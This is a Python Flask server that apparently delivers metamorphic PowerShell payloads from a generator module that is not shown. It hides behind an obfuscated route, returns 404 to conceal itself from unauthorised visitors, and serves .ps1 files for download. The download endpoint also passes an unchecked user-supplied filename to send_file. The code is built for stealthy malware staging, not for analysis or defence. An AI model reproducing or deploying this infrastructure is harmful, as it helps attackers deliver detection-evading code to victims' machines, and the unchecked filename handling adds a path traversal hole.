from flask import Flask, jsonify, request, abort, send_file, Response
from payload_generator import generate_metamorphic_payload
from config import API_KEY, OBFUSCATED_PATH
import os

app = Flask(__name__)

# Middleware for API Key Verification
def require_api_key(func):
    def wrapper(*args, **kwargs):
        api_key = request.headers.get('x-api-key')
        if api_key != API_KEY:
            abort(404)  # 404 instead of 401 to hide existence
        return func(*args, **kwargs)
    wrapper.__name__ = func.__name__
    return wrapper

# Completely remove index or default routes
@app.route('/', methods=['GET'])
def index():
    abort(404)  # Just show 404

# Generate endpoint returns raw PowerShell content
@app.route(OBFUSCATED_PATH, methods=['POST'])
@require_api_key
def generate_payload():
    try:
        payload_file = generate_metamorphic_payload()
        with open(payload_file, 'r') as f:
            content = f.read()
        return Response(content, mimetype='text/plain')
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

# Download endpoint serves .ps1 file
@app.route('/download/<filename>', methods=['GET'])
@require_api_key
def download_payload(filename):
    try:
        if not filename.endswith('.ps1'):
            filename += '.ps1'
        return send_file(
            filename,
            mimetype='application/x-powershell',
            as_attachment=True,
            download_name=filename
        )
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": "File not found"
        }), 404

# Catch-all for everything else that should not exist
@app.errorhandler(404)
def not_found(e):
    return "404 Not Found", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
